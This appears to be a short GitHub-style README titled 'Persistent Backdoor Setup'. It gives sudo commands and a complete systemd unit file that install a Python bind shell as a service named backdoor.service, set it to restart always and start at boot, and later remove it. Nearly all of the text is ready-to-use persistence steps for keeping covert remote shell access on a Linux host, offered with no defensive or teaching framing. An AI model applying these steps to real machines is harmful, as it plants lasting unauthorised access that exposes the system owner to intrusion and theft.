# Persistent Backdoor Setup

---

## **Step 1: Move the Script to a Persistent Location**
Move your Python bind shell script to `/usr/local/bin/` and make it executable:

```bash
sudo mv your_script.py /usr/local/bin/shell.py
sudo chmod +x /usr/local/bin/shell.py
```

## **Step 2: Create a Systemd Service File**

```bash
sudo nano /etc/systemd/system/backdoor.service
```

## **Step 3: Add the following content:**

```bash
[Unit]
Description=Persistent backdoor
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/shell.py
Restart=always

[Install]
WantedBy=multi-user.target

```

## **Step 4: Enable and Start the Service**

```bash
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service

```

## **Step 5: Verify Service Status**

```bash
sudo systemctl status backdoor.service
```

## **Step 6: Stop and Remove the Service (If Needed)**

```bash
sudo systemctl stop backdoor.service
sudo systemctl disable backdoor.service
sudo rm /etc/systemd/system/backdoor.service
sudo systemctl daemon-reload
```

# Author
- **GitHub**: [@nahid0x1](https://github.com/nahid0x1)
- **Twitter**: [@nahid0x1](https://x.com/nahid0x1)
- **Linkedin**: [@nahid0x1](https://www.linkedin.com/in/nahid0x1)
- **Email**: [nahid0x1.official@gmail.com](mailto:nahid0x1.official@gmail.com)
